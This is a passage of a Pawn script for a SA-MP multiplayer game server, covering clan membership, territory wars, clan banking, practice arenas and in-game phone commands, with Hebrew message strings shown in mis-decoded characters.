		if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфщх· сўьря ыр∙° р·ф сыЁхЇщщф");
		claninfo[playerinfo[playerid][iclan]][cplayers][claninfo[playerinfo[playerid][iclan]][cmembers]] = playerid;
    	new string[M_S];
		for(new j=0;j<claninfo[playerinfo[playerid][iclan]][cmembers];j++)
		{
			format(string,sizeof(string)," .фЎш°є ьўьря ∙ьъ %s",GetName(playerid));
			SendClientMessage(claninfo[playerinfo[playerid][iclan]][cplayers][j],green,string);
		}
		claninfo[playerinfo[playerid][iclan]][cmembers]++;
		playerinfo[playerid][clan] = playerinfo[playerid][iclan];
		ClanPList_Add(playerinfo[playerid][iclan],playerid);
		playerinfo[playerid][lclan] = 1;
		SetPlayerColor(playerid,rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],100));
		format(string,sizeof(string)," .\"%s\" фЎш°Ї· ьўьря",claninfo[playerinfo[playerid][clan]][cname]);
		SendClientMessage(playerid,green,string);
		playerinfo[playerid][iclan] = 0;
		playerinfo[playerid][lastrec] = 0;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"ClanCode",clancode(playerinfo[playerid][clan]));
		new rules = 0;
		for(new i = 0; i < sizeof(crules[]); i++)
		{
			if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
			rules++;
		}
		if(rules > 1)
		{
			format(string,sizeof(string)," ~~~ :%s чхўщ фўьря ~~~",claninfo[playerinfo[playerid][clan]][cname]);
			SendClientMessage(playerid,lightblue,string);
			for(new i = 0; i < sizeof(crules[]); i++)
			{
				if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
				format(string,sizeof(string)," Х %02d. %s",i+1,crules[playerinfo[playerid][clan]][i]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/ccancel"))
	{
	    new string[M_S];
 		if(playerinfo[playerid][iclan] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ўьря");
		for(new j=0;j<claninfo[playerinfo[playerid][iclan]][cmembers];j++)
		{
			format(string,sizeof(string)," .сщшь р· ффцюЁф ьфЎш°Їх· ьўьря ∙ьъ %s",GetName(playerid));
			SendClientMessage(claninfo[playerinfo[playerid][iclan]][cplayers][j],green,string);
		}
		format(string,sizeof(string)," .\"%s\" сщшь· р· ффцюЁф ьфЎш°Їх· ьўьря",claninfo[playerinfo[playerid][iclan]][cname]);
		SendClientMessage(playerid,green,string);
		playerinfo[playerid][iclan] = 0;
		playerinfo[playerid][lastrec] = 0;
		return 1;
   	}*/
	if(equal(cmd, "/cmembers"))
	{
		new clanid, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /cmembers [clan name] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," (фўьря щфщф фўьря ∙ьъ clan name сющуф хьр щщ°∙э)");
		}
		if(!strlen(cmd))
		{
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° х°∙хэ");
			if(!playerinfo[playerid][clan] || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .р·ф ьр сўьря");
			else
			{
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				clanid = fgetint(string,"ID");
			}
		}
		else
		{
			format(string,sizeof(string),"/DM/Clans/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
			else clanid = fgetint(string,"ID");
		}
		format(claninfo[clanid][cname],256,fgetstring(string,"Name"));
		format(string,sizeof(string)," ~~~ :\"%s\" чс°щ фўьря ~~~",claninfo[clanid][cname]);
		SendClientMessage(playerid,lightblue,string);
		if(!claninfo[clanid][cmembers]) return SendClientMessage(playerid,red," .рщя ∙чўЁщэ ючхс°щэ юўьря цф");
		new c = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid)
		{
			format(string,sizeof(string)," Х %d. %s (ID: %03d | Clan Level: %d)",++c,GetName(i),i,playerinfo[i][lclan]);
			SendClientMessage(playerid,playerinfo[i][lclan] == 5 ? orange : yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/carea"))
	{
		new string[M_S], c = GetPlayerHQ(playerid);
		cmd = strtok(cmdtext,idx);
		if(claninfo[c][cname] == 0) return SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° ЁюЎр сю∙щю· ф∙·ьшх· ыь∙фщ·");
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /carea [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /carea war :ф∙·ьшх· Єь фюЇўуф ∙р·ф ЁюЎр сф");
			SendClientMessage(playerid,white," /carea retreat :ьфЇёщў р· юьчю· фф∙·ьшх·");
			return SendClientMessage(playerid,white," /carea leave :ь∙ч°° юЇўуф ∙ф∙·ьш· Єьщф");
		}
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .р·ф ьр с∙хэ ўьря");
		if(!HasClanPermission(playerid,clanperm_carea)) return 1;
		if(equal(cmd,"war"))
		{
			if(equal(claninfo[c][cname],"gmR") || equal(claninfo[c][cname],"Hyper")) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ьш Єь юЇўуф цр·");
			if(claninfo[playerinfo[playerid][clan]][cruling][0] > 0) return SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° ЁюЎр сю∙щю· ф∙·ьшх· ыь∙фщ·");
			for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid] && claninfo[i][cruling][0] > 0 && claninfo[i][cruling][0] == c) return SendClientMessage(playerid,red," .ўьря рч° ыс° ю∙·ьш Єь фўьря фцф, ьр Ёщ·я ьф·чщь ю∙щю· ф∙·ьшх·");
			if(!c) return SendClientMessage(playerid,red," .р·ф ьр с∙хэ рцх° ўьря");
			if(c == playerinfo[playerid][clan] && claninfo[playerinfo[playerid][clan]][cruler] == playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьф∙·ьш Єь рцх° фўьря ∙ьъ");
			if(claninfo[c][cpeace][playerinfo[playerid][clan]] || claninfo[playerinfo[playerid][clan]][cpeace][c]) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьф∙·ьш Єь рцх° ∙ь ўьря с∙ьхэ рщ·ъ");
			if(claninfo[c][cruler] == playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .рцх° фўьря фцф ыс° с∙ьщш·ъ");
			if(claninfo[claninfo[c][cruler]][cpeace][playerinfo[playerid][clan]] || claninfo[playerinfo[playerid][clan]][cpeace][claninfo[c][cruler]]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·ьш Єь рцх° ўьря ∙Ё∙ьш Єь щущ ўьря с∙ьхэ Єэ фўьря ∙ьъ");
			new mem[2] = {0,0};
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == c && !playerinfo[i][modeafk]) mem[0]++;
			if(mem[0] < 3) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьф∙·ьш Єь юЇўу· ўьря ∙щ∙ ююЁх Їчх· ю 3 ∙чўЁщэ ючхс°щэ");
			if(!GetPlayerVirtualWorld(playerid)) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && GetPlayerHQ(i) == c) mem[1]++;
			if(mem[1] < 3) return SendClientMessage(playerid,red," .щ∙ Їчх· ю 3 чс°щ ўьря срцх°, чхсф ьЇчх· ∙ьх∙ф ∙чўЁщэ юфўьря ∙ьъ ьЎх°ъ фф∙·ьшх·");
			if(c == playerinfo[playerid][clan]) format(string,sizeof(string)," -> !фчь ф∙·ьшх· счц°ф Єь юЇўу· фўьря ∙ьх {%s}%s" @c(lightblue) " юфўьря %s <-",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			else if(claninfo[c][cruler] == c) format(string,sizeof(string)," -> !{%s}%s" @c(lightblue) " фчь ф∙·ьшх· Єь юЇўу· фўьря {%s}%s" @c(lightblue) " юфўьря %s <-",ClanHexColor(c),claninfo[c][cname],ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			else format(string,sizeof(string)," -> !{%s}%s" @c(lightblue) " ∙Ё∙ьш· Єь щущ фўьря {%s}%s" @c(lightblue) " фчь ф∙·ьшх· Єь юЇўу· фўьря {%s}%s" @c(lightblue) " юфўьря %s <-",ClanHexColor(claninfo[c][cruler]),claninfo[claninfo[c][cruler]][cname],ClanHexColor(c),claninfo[c][cname],ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				if(playerinfo[i][clan] == playerinfo[playerid][clan])
				{
					if(GetPlayerHQ(i) == c) format(string,sizeof(string)," !Єьщъ ьф∙р° срцх° цф сю∙ъ 4 уўх· сьщ ьюх· ,{%s}%s" @c(yellow) " р·ф ю∙··є сю∙щю· фф∙·ьшх· Єь фўьря",ClanHexColor(c),claninfo[c][cname]);
					else
					{
						if(claninfo[c][cclosetele] == -1) format(string,sizeof(string)," !р·ф юхцюя ьсхр хьЄцх° ьфэ ,{%s}%s" @c(yellow) " ы°тЄ %d ючс°щ фўьря ∙ьъ ЁюЎрщэ сю∙щю· ф∙·ьшх· Єь фўьря",ClanHexColor(c),claninfo[c][cname],mem[1]);
						else format(string,sizeof(string)," (%s :р·ф юхцюя ьсхр хьЄцх° ьфэ! (∙щтх° ў°хс ,{%s}%s" @c(yellow) " ы°тЄ %d ючс°щ фўьря ∙ьъ ЁюЎрщэ сю∙щю· ф∙·ьшх· Єь фўьря",Teleports[claninfo[c][cclosetele]][Tcmd],ClanHexColor(c),claninfo[c][cname],mem[1]);
					}
					SendClientMessage(i,yellow,string);
				}
				else if(playerinfo[i][clan] == c)
				{
					format(string,sizeof(string)," !/%s :ф·чщь сщчу Єэ %d юф∙чўЁщэ ∙сх ю∙щю· ф∙·ьшх· Єь юЇўу· фўьря ∙ьъ, ыурщ ьюф° ьфтя {%s}%s" @c(red) " фўьря",claninfo[c][ccmd],mem[1],ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname]);
					SendClientMessage(i,red,string);
					SendClientMessage(i,red," !рэ щ∙р°х щх·° ю-3 ∙чўЁщэ чщщэ ·хъ 4 уўх·, фэ щЎьщчх ьф∙·ьш Єь фюЇўуф");
				}
			}
			if(claninfo[c][cgzoneshow] && claninfo[c][cgzone] != INVALID_GANG_ZONE) GangZoneFlashForAll(claninfo[c][cgzone],rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],150));
			claninfo[playerinfo[playerid][clan]][cruling][0] = c, claninfo[playerinfo[playerid][clan]][cruling][1] = 240;
			SetTimerPck(claninfo[playerinfo[playerid][clan]][cruling][2],"HeadquarterRuling",1000,1,"i",playerinfo[playerid][clan]);
			HQRulingTimer(playerinfo[playerid][clan],'s');
		}
		else if(equal(cmd,"retreat"))
		{
			if(!c) return SendClientMessage(playerid,red," .р·ф ьр с∙хэ рцх° ўьря");
			if(!claninfo[playerinfo[playerid][clan]][cruling][0]) return SendClientMessage(playerid,red," .фўьря ∙ьъ ьр срюЎЄ ф∙·ьшх· Єь ∙хэ юЇўуф");
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				string = "";
				if(playerinfo[i][clan] == playerinfo[playerid][clan])
				{
					if(GetPlayerHQ(i) == c)
					{
						format(string,sizeof(string)," !юфўьря ∙ьъ фЇёщў р· фюьчюф %s ,Єьщъ ьфЇёщў ьфьчэ",GetName(playerid));
						StopPlayer(i);
					}
					else format(string,sizeof(string)," !юфўьря ∙ьъ фЇёщў р· фюьчюф %s",GetName(playerid));
				}
				else if(playerinfo[i][clan] == c) format(string,sizeof(string)," !фЇёщў р· фюьчюф {%s}%s" @c(yellow) " юфўьря %s",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
				if(strlen(string) > 0) SendClientMessage(i,yellow,string);
			}
			Retreat(playerinfo[playerid][clan],"фўьря фю∙·ьш фЇёщў р· фф∙·ьшх·");
		}
		else if(equal(cmd,"leave"))
		{
			if(!c) return SendClientMessage(playerid,red," .р·ф ьр с∙хэ рцх° ўьря");
			if(c == playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙ч°° р· юЇўу· фўьря ∙ьъ");
			if(claninfo[c][cruler] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фюЇўуф фцх рщЁф с∙ьщш· фўьря ∙ьъ");
			claninfo[c][cruler] = c;
			UpdateClanGangZone(c);
			format(string,sizeof(string)," .%s фхЇёўф Єь щущ {%s}%s" @c(green) " фф∙·ьшх· ∙ь фўьря ∙ьъ Єь фўьря",GetName(playerid),ClanHexColor(c),claninfo[c][cname]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == c || playerinfo[i][clan] == playerinfo[playerid][clan]))
			{
				if(playerinfo[i][clan] == c) SendClientMessage(i,green," .юЇўу· фўьря ∙ьъ ∙хч°°ф юфф∙·ьшх·");
				if(playerinfo[i][clan] == playerinfo[playerid][clan]) SendClientMessage(i,green,string);
			}
			format(string,sizeof(string)," -> !{%s}%s" @c(lightblue) " ∙ч°° р· фф∙·ьшх· Єь юЇўу· фўьря {%s}%s" @c(lightblue) " юфўьря %s <-",ClanHexColor(c),claninfo[c][cname],ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/cdepositall"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .р·ф ьр сўьря");
		if(claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .фсЁў ∙ь фўьря ∙ьъ ЁЄхь");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		//if(cpinfo[playerinfo[playerid][cp]][cppar] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фсЁў фцф ьр ∙щщъ ьўьря ∙ьъ");
		if(!HasClanPermission(playerid,clanperm_deposit)) return 1;
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .рщя сщщуъ ыёє фЁщ·я ьфЇўуф");
		new string[M_S];
		if(GetMoney(playerid)+claninfo[playerinfo[playerid][clan]][cbank] > claninfo[playerinfo[playerid][clan]][cmaxbank])
		{
			format(string,sizeof(string)," .$%d сЁў фўьря щыхь ьфыщь Єу",claninfo[playerinfo[playerid][clan]][cmaxbank]);
			return SendClientMessage(playerid,red,string);
		}
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		format(string,sizeof(string),"%s: deposit all, %d$ (%d$ -> %d$)",claninfo[playerinfo[playerid][clan]][cname],GetMoney(playerid),claninfo[playerinfo[playerid][clan]][cbank],claninfo[playerinfo[playerid][clan]][cbank]+GetMoney(playerid));
		Log("Clans",playerid,string);
		format(string,sizeof(string)," фЇўщу р· ыь фыёє ссЁў фўьря - $%d %s",GetMoney(playerid),GetName(playerid));
		CBankLog(playerinfo[playerid][clan],string);
		claninfo[playerinfo[playerid][clan]][cbank] += GetMoney(playerid);
		GiveMoney(playerid,0-GetMoney(playerid),31);
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .фЇўу· р· ыь ыёЇъ сч∙схя фсЁў ∙ь фўьря ∙ьъ, ыЄ· щ∙ ∙э %d$",claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/cwithdrawall"))
	{
		new string[M_S];
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .р·ф ьр сўьря");
		if(claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .фсЁў ∙ь фўьря ∙ьъ ЁЄхь");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		//if(cpinfo[playerinfo[playerid][cp]][cppar] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фсЁў фцф ьр ∙щщъ ьўьря ∙ьъ");
		if(!HasClanPermission(playerid,clanperm_withdraw)) return 1;
		GiveMoney(playerid,claninfo[playerinfo[playerid][clan]][cbank],31);
		format(string,sizeof(string)," фхЎщр р· ыь фыёє ссЁў - $%d %s",claninfo[playerinfo[playerid][clan]][cbank],GetName(playerid));
		CBankLog(playerinfo[playerid][clan],string);
		format(string,sizeof(string),"%s: withdraw all, %d$ (%d$ -> 0$)",claninfo[playerinfo[playerid][clan]][cname],claninfo[playerinfo[playerid][clan]][cbank],claninfo[playerinfo[playerid][clan]][cbank]);
		Log("Clans",playerid,string);
		claninfo[playerinfo[playerid][clan]][cbank] = 0;
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .фЇўу· р· ыь ыёЇъ сч∙схя фсЁў ∙ь фўьря ∙ьъ, ыЄ· щ∙ ∙э %d$",claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/test"))
	{
		if(!CanBeTeleported(playerid)) return 1;
		cmd = strtok(cmdtext,idx);
		new id = 0, string[M_S];
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /test [1-%d] :Ўх°· ф∙щюх∙",sizeof(BattlePositions));
			return SendClientMessage(playerid,white,string);
		}
		id = strval(cmd);
		if(id < 1 || id > sizeof(BattlePositions)) return SendClientMessage(playerid,red," .юёЇ° рцх° ∙тхщ");
		id--;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerInterior(playerid,BattleInteriors[id]);
		if(!random(2))
		{
			SetPlayerPos(playerid,BattlePositions[id][0],BattlePositions[id][1],BattlePositions[id][2]);
			SetPlayerFacingAngle(playerid,BattlePositions[id][3]);
		}
		else
		{
			SetPlayerPos(playerid,BattlePositions2[id][0],BattlePositions2[id][1],BattlePositions2[id][2]);
			SetPlayerFacingAngle(playerid,BattlePositions2[id][3]);
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerHealth(playerid,100.0);
		SetPlayerArmour(playerid,100.0);
		GiveWeapon(playerid,22,10000);
		GiveWeapon(playerid,26,10000);
		playerinfo[playerid][test] = id;
		GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_microsmg),10000);
		SetPlayerArmedWeapon(playerid,0);
		return 1;
	}
	if(equal(cmd,"/1on1"))
	{
		if(playerinfo[playerid][modeafk] || playerinfo[playerid][inact] ||
		playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][reqclass] ||
		playerinfo[playerid][inbattle] || playerinfo[playerid][indrift] ||
		playerinfo[playerid][inprace] || playerinfo[playerid][incrane] ||
		GetPlayerState(playerid) == PLAYER_STATE_SPECTATING || playerinfo[playerid][incwar] ||
		playerinfo[playerid][ach][0] != -1 || playerinfo[playerid][srstarted] ||
		playerinfo[playerid][srin] || WaitingAct(playerid) || playerinfo[playerid][tdmzone] != tdmz_none) return 1;
		cmd = strtok(cmdtext,idx);
		new id = 0, string[M_S], cPlayers = 0;
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /1on1 [1-%d] :Ўх°· ф∙щюх∙",sizeof(BattlePositions));
			return SendClientMessage(playerid,white,string);
		}
		id = strval(cmd);
		if(id < 1 || id > sizeof(BattlePositions)) return SendClientMessage(playerid,red," .юёЇ° рцх° ∙тхщ");
		id--;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][test] == id) cPlayers++;
		if((cPlayers % 2) == 0)
		{
			SetPlayerPos(playerid,BattlePositions[id][0],BattlePositions[id][1],BattlePositions[id][2]);
			SetPlayerFacingAngle(playerid,BattlePositions[id][3]);
			SetPlayerVirtualWorld(playerid,GetEmptyWorld());
		}
		else
		{
			SetPlayerPos(playerid,BattlePositions2[id][0],BattlePositions2[id][1],BattlePositions2[id][2]);
			SetPlayerFacingAngle(playerid,BattlePositions2[id][3]);
			new w = 0;
			for(new i = 0, tmp = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][test] == id)
			{
				tmp = GetPlayerVirtualWorld(i);
				if(GetPlayersInVirtualWorld(tmp) == 1) w = tmp;
			}
			SetPlayerVirtualWorld(playerid,w);
		}
		SetPlayerInterior(playerid,BattleInteriors[id]);
		SetCameraBehindPlayer(playerid);
		SetPlayerHealth(playerid,100.0);
		SetPlayerArmour(playerid,100.0);
		GiveWeapon(playerid,22,10000);
		GiveWeapon(playerid,26,10000);
		GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_microsmg),10000);
		SetPlayerArmedWeapon(playerid,0);
		playerinfo[playerid][test] = id;
		return 1;
	}
	if(equal(cmd,"/qtest"))
	{
		if(playerinfo[playerid][test] == -1) return SendClientMessage(playerid,red," .р·ф ьр срцх° шёшщэ");
		playerinfo[playerid][test] = -1;
		SpawnPlayer(playerid);
		SendClientMessage(playerid,green," .щЎр· юрцх° фшёшщэ");
		return 1;
	}
	if(equal(cmd,"/cbug"))
	{
		if(playerinfo[playerid][incbug][0])
		{
			playerinfo[playerid][incbug] = {0,0,0,0};
			SpawnPlayer(playerid);
			SendClientMessage(playerid,green," .C-Bug-щЎр· ю");
		}
		else
		{
			if(!CanBeTeleported(playerid)) return 1;
			playerinfo[playerid][incbug] = {1,0,0,0};
			SetPlayerPos(playerid,1377.3400,769.5937,10.8203);
			SetPlayerFacingAngle(playerid,180.6921);
			SetPlayerVirtualWorld(playerid,GetEmptyWorld());
			SetPlayerInterior(playerid,0);
			ResetWeapons(playerid);
			GiveWeapon(playerid,24,7);
			SendClientMessage(playerid,green," (∙хс /cbug ·°хўя р· фючёЁщ· с°тЄ ∙Ёхч ьъ! (ьщЎщрф ,C-Bug ЁыЁё· ьрцх° сущў·");
			GameTextForPlayer(playerid,"~b~c-bug test~n~~g~good luck!",2500,5);
		}
		return 1;
	}
	if(equal(cmd,"/resetwanted"))
	{
		if(!GetPlayerWantedLevel(playerid)) return SendClientMessage(playerid,red," .рщя ьъ °ю· юсхў∙х·");
		if(GetMoney(playerid) < 100) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		SetWantedLevel(playerid,0);
		GiveMoney(playerid,0-100,17);
		SendClientMessage(playerid,green," .°ю· фюсхў∙х· ∙ьъ щ°уф");
		return 1;
	}
	if(equal(cmd,"/phone"))
	{
		if(playerinfo[playerid][phone] == -1) return SendClientMessage(playerid,red," .рщя ьъ ЇьрЇхя");
		if(playerinfo[playerid][phone] < 1) return SendClientMessage(playerid,red," .фЇьрЇхя ∙ьъ ьр ст°ёф ю·рщюф ь∙щюх∙ с·Ї°щш");
		new options[][32] =
		{
			"ф·ў∙° - /call",
			"юЄЁф - /answer",
			"Ёщ·хў - /hangup",
			"SMS - /pm",
			"фхуЄф ьрующЁщэ - /a",
			"фхуЄф ьўьря - !",
			"∙хш°щэ - 100",
			"°хЇрщэ - 101",
			"∙щЁхщ юхуь ЇьрЇхя",
			"∙щЁхщ ЄщЎхс"
		}, optstr[512];
		for(new i = 0; i < sizeof(options); i++) format(optstr,sizeof(optstr),!strlen(optstr) ? ("%s%s") : ("%s\n%s"),optstr,ColouredText(options[i],playerinfo[playerid][phonedesign]));
		ShowPlayerDialog(playerid,dialog_phone,DIALOG_STYLE_LIST,ColouredText("·Ї°щш фЇьрЇхя",playerinfo[playerid][phonedesign]),optstr,"счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/buyphone"))
	{
		if(!IsPlayerInStore(playerid,store_phones)) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· счЁх· фЇьрЇхЁщэ");
		new string[M_S], dia[300];
		for(new i = 0; i < sizeof(phoneTypes); i++)
		{
			format(string,sizeof(string),"%d) ух° %d.0 (%s): %s, сючщ° $%d",i+1,i+1,phoneTypes[i][phText],phoneTypes[i][phType],phoneTypes[i][phCost]);
			format(dia,sizeof(dia),!strlen(dia) ? ("%s%s") : ("%s\n%s"),dia,string);
		}
		ShowPlayerDialog(playerid,dialog_buyphone,DIALOG_STYLE_LIST,@c(lightblue) "ўЁщщ· ЇьрЇхя",dia,"ўЁщщф","сщшхь");
		return 1;
	}
	if(equal(cmd,"/ccbuyphone"))
	{
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ");
		if(playerinfo[playerid][phone] > -1) return SendClientMessage(playerid,red," /sellphone :ыс° щ∙ ьъ ЇьрЇхя, Єь юЁ· ьюых° рх·х");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /ccbuyphone [type] :Ўх°· ф∙щюх∙");
			new string[M_S];
			for(new i = 0; i < sizeof(phoneTypes); i++)
			{
				format(string,sizeof(string)," /ccbuyphone %d - т°ёф %d.0 (%s): %s, сючщ° $%d",i+1,phoneTypes[i][phCost],phoneTypes[i][phText],phoneTypes[i][phType],i+1);
				SendClientMessage(playerid,white,string);
			}
			return 1;
		}
		new id = strval(cmd), string[M_S];
		if(id < 1 || id > sizeof(phoneTypes)) return SendClientMessage(playerid,red," .юёЇ° ёхт ЇьрЇхя ∙тхщ");
		id--;
		if(playerinfo[playerid][bank] < phoneTypes[id][phCost]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьўЁщщ· ЇьрЇхя юёхт цф");
		playerinfo[playerid][phone] = id;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Phone",id);
		format(string,sizeof(string)," !ўЁщ· ЇьрЇхя ст°ёф %d.0",id+1);
		SendClientMessage(playerid,green,string);
		UpdateBank(GetName(playerid),strreplace(string," !"," "),0-phoneTypes[id][phCost]);
		return 1;
	}
	if(equal(cmd,"/sellphone"))
	{
		if(playerinfo[playerid][phone] == -1) return SendClientMessage(playerid,red," .рщя ьъ ЇьрЇхя");
		if(playerinfo[playerid][calling] != -1) return SendClientMessage(playerid,red," /hangup :р·ф ьр щыхь ьюых° р· фЇьрЇхя ∙ьъ ·хъ ыущ ∙щчф, ьЁщ·хў");
		GiveMoney(playerid,phoneTypes[playerinfo[playerid][phone]][phCost] / 2,32);
		new string[M_S];
		format(string,sizeof(string)," .юы°· р· фЇьрЇхя ∙ьъ хўщсь· Єьщх ючЎщ· юючщ°х - $%d",phoneTypes[playerinfo[playerid][phone]][phCost] / 2);
		SendClientMessage(playerid,green,string);
		playerinfo[playerid][phone] = -1;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Phone",-1);
		return 1;
	}
	if(equal(cmd,"/phonedesign"))
	{
		if(playerinfo[playerid][phone] == -1) return SendClientMessage(playerid,red," .рщя ьъ ЇьрЇхя");
		if(playerinfo[playerid][phone] < 1) return SendClientMessage(playerid,red," .фЇьрЇхя ∙ьъ ьр ст°ёф ю·рщюф ь∙щюх∙ сЇўхуф фцх");
		if(playerinfo[playerid][calling] != -1) return SendClientMessage(playerid,red," /hangup :р·ф ьр щыхь ьюых° р· фЇьрЇхя ∙ьъ ·хъ ыущ ∙щчф, ьЁщ·хў");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /phonedesign [red] [green] [blue] :Ўх°· ф∙щюх∙");
		new rgb[3];
		rgb[0] = strval(cmd);
		for(new i=1;i<3;i++) cmd = strtok(cmdtext,idx), rgb[i] = !strlen(cmd) || !IsNumeric(cmd)? rgb[i-1]:strval(cmd);
		playerinfo[playerid][phonedesign] = rgba2hex(rgb[0],rgb[1],rgb[2],255);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"PhoneDesign",playerinfo[playerid][phonedesign]);
		SendClientMessage(playerid,playerinfo[playerid][phonedesign]," .фчьЇ· р· ЄщЎхс фЇьрЇхя ьЎсЄ ффхуЄф фцх");
		return 1;
	}
	if(equal(cmd,"/call"))
	{
		if(playerinfo[playerid][phone] == -1) return SendClientMessage(playerid,red," /buyphone :рщя ьъ ЇьрЇхя, ьўЁщщф");
		new string[M_S];
		cmd = strtok(cmdtext, idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /call [id/name] :Ўх°· ф∙щюх∙");
